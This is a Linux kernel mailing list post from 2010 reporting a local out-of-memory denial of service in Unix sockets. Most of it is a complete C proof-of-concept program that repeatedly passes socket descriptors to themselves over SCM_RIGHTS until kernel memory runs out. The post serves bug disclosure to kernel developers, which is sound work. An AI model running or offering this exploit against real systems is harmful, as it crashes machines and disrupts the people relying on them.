Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752627Ab0KWWVH (ORCPT <rfc822;w@1wt.eu>);
	Tue, 23 Nov 2010 17:21:07 -0500
Received: from mail-pw0-f46.google.com ([209.85.160.46]:47128 "EHLO
	mail-pw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751458Ab0KWWVF (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 23 Nov 2010 17:21:05 -0500
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=mime-version:date:message-id:subject:from:to:cc:content-type;
        b=Gdvg/vPYOcaGHPRvyDlqQA1STwlVV5Mohu/8we4kWrXx0VQbxQFTzOM4qW6zNnKTSj
         b2wMOXNc315VqOffN7A5JzZVzVuI2e6Z3ZzW9mSlFCsm4fDA7LnZzPOXC6qIwLGnIvj4
         MvQHhi0t+0qG3vcYhgchb0W1+1o6/qcEiViaA=
MIME-Version: 1.0
Date: Tue, 23 Nov 2010 23:21:05 +0100
Message-ID: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
Subject: Unix socket local DOS (OOM)
From: Vegard Nossum <vegard.nossum@gmail.com>
To: LKML <linux-kernel@vger.kernel.org>
Cc: Andrew Morton <akpm@linux-foundation.org>, Eugene Teo <eugene@redhat.com>
Content-Type: text/plain; charset=UTF-8
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi,

I found this program lying around on my laptop. It kills my box
(2.6.35) instantly by consuming a lot of memory (allocated by the
kernel, so the process doesn't get killed by the OOM killer). As far
as I can tell, the memory isn't being freed when the program exits
either. Maybe it will eventually get cleaned up the UNIX socket
garbage collector thing, but in that case it doesn't get called
quickly enough to save my machine at least.

#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int send_fd(int unix_fd, int fd)
{
        struct msghdr msgh;
        struct cmsghdr *cmsg;
        char buf[CMSG_SPACE(sizeof(fd))];

        memset(&msgh, 0, sizeof(msgh));

        memset(buf, 0, sizeof(buf));
        msgh.msg_control = buf;
        msgh.msg_controllen = sizeof(buf);

        cmsg = CMSG_FIRSTHDR(&msgh);
        cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;

        msgh.msg_controllen = cmsg->cmsg_len;

        memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
        return sendmsg(unix_fd, &msgh, 0);
}

int main(int argc, char *argv[])
{
        while (1) {
                pid_t child;

                child = fork();
                if (child == -1)
                        exit(EXIT_FAILURE);

                if (child == 0) {
                        int fd[2];
                        int i;

                        if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
                                goto out_error;

                        for (i = 0; i < 100; ++i) {
                                if (send_fd(fd[0], fd[0]) == -1)
                                        goto out_error;

                                if (send_fd(fd[1], fd[1]) == -1)
                                        goto out_error;
                        }

                        close(fd[0]);
                        close(fd[1]);
                        goto out;

                out_error:
                        fprintf(stderr, "error: %s\n", strerror(errno));
                out:
                        exit(EXIT_SUCCESS);
                }

                while (1) {
                        pid_t kid;
                        int status;

                        kid = wait(&status);
                        if (kid == -1) {
                                if (errno == ECHILD)
                                        break;
                                if (errno == EINTR)
                                        continue;

                                exit(EXIT_FAILURE);
                        }

                        if (WIFEXITED(status)) {
                                if (WEXITSTATUS(status))
                                        exit(WEXITSTATUS(status));
                                break;
                        }
                }
        }

        return EXIT_SUCCESS;
}


Vegard
